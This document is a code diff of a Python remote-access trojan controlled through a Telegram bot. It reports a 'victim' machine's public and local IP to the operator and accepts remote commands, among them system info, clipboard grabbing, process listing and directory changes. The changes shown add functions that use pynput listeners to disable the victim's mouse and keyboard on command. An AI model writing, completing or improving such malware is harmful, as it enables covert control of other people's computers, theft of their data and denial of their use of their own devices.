@@ -15,29 +15,31 @@ import os
 # get file location
 cwd = getcwd()
 # create functions
-def check_internret():
+def check_internret(): # send a request to google.com to check internet connection
     try:
         requests.get("https://www.google.com/")
         return True
     except: 
         return False
-if check_internret():
+if check_internret(): # if internet connection was success run main program
+    from time import tzname, sleep, strftime
+    from subprocess import getoutput, Popen
+    from pyautogui import write, hotkey
+    from pynput import mouse, keyboard
     import json, wget, webbrowser
     from bs4 import BeautifulSoup
-    from platform import uname
-    from subprocess import getoutput, Popen
-    from time import tzname, sleep, strftime
     from getpass import getuser
-    from Its_Hub import Its_Hub
-    from pyautogui import write, hotkey
-    Hub = Its_Hub()
-    os = Hub.OS()
-    mouse = Hub.Mouse()
-    keyboard = Hub.Keyboard()
-    ip = requests.get("https://api.ipify.org/").text
-    local_ip = os.Get_IP()
+    from platform import uname
+    import threading
+    import socket
+    # create first values
+    mouse_listener = mouse.Listener(suppress=True)
+    keyboard_listener = keyboard.Listener(suppress=True)
+    web_ip = requests.get("https://api.ipify.org/").text
+    local_ip = socket.gethostbyname(socket.gethostname())
     token = BOT_TOKEN 
     id = TELEGRAM_ID
+    keep_disable = True
     commands = ["/check", 
                 "/sysinfo", 
                 "/get_clipboard", 
@@ -63,7 +65,8 @@ if check_internret():
                 "/show_info",
                 "/show_warning",
                 "/voice",
-                "/dis_all",
+                "/disable_mouse_keyboard",
+                "/enable_mouse_keyboard",
                 "/chdir",
                 "/process",
                 "/chruns",
@@ -306,21 +309,17 @@ if check_internret():
             voice = Hub.Voice(text)
             voice.Say()
         except: send_msg("Error;")
-    def dis_all():
+    def disable_mouse_keyboard():
         try:
-            keyboard.Disable_keyboard()
-            mouse.Disable_mouse()
-            send_msg("how many seconds disable(write number in 8 seconds)?")
-            sleep(8)
-            try:
-                num = int(read_msg())
-            except: 
-                send_msg("Invalid Input.")
-                break
-            sleep(num)
-            keyboard.Enable_keyboard()
-            mouse.Enable_mouse()
-            send_msg("Mouse and Keyboard is disabled.")
+            send_msg("Mouse and Keyboard is getting disable.")
+            mouse_listener.start()
+            keyboard_listener.start()
+        except: send_msg("Error;")
+    def enable_mouse_keyboard():
+        try:
+            send_msg("Mouse and Keyboard is getting enable.")    
+            mouse_listener.stop()
+            keyboard_listener.stop()
         except: send_msg("Error;")
     def change_dir():
         try:
@@ -443,7 +442,8 @@ if check_internret():
                     if command.startswith("/show_info"): show_info()
                     if command.startswith("/show_warning"): show_warning()
                     if command.startswith("/voice"): voice()
-                    if command.startswith("/dis_all"): dis_all()
+                    if command.startswith("/disable_mouse_keyboard"): threading.Thread(target=disable_mouse_keyboard).start()
+                    if command.startswith("/enable_mouse_keyboard"): threading.Thread(target=enable_mouse_keyboard).start()
                     if command.startswith("/chdir"): change_dir()
                     if command.startswith("/process"): process()
                     if command.startswith("/chruns"):  chruns()# Check run locations
@@ -460,9 +460,9 @@ if check_internret():
             except: 
                 send_msg("start() function error. try again...")
                 continue
-    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. Whene trap close I will notif you.")
+    send_msg(f"Connected to victim with {web_ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. When trap close I will notic you.")
 ONLINE_CODE
     send_msg(f"Victim is closed trap at {strftime("%H:%M:%S")}(write /commands for help).")
     listener()
-else:
+else: # if network has broken run offline code
 OFFLINE_CODE
